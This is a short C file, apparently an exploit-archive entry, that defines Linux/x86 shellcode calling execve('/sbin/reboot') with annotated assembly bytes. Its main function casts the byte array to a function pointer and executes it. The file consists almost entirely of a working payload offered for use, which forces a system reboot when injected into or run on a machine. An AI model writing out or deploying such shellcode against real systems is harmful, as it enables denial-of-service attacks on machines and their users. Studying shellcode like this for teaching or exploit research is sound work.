#include <stdio.h>

const char shellcode[]=
	"\x6a\x0b"		// push	$0xb
	"\x58"			// pop	%eax
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x68\x62\x6f\x6f\x74"	// push	$0x746f6f62
	"\x68\x6e\x2f\x72\x65"	// push	$0x65722f6e
	"\x68\x2f\x73\x62\x69"	// push	$0x6962732f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 execve(/sbin/reboot,/sbin/reboot)"
		"\n[+] Date: 11/07/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}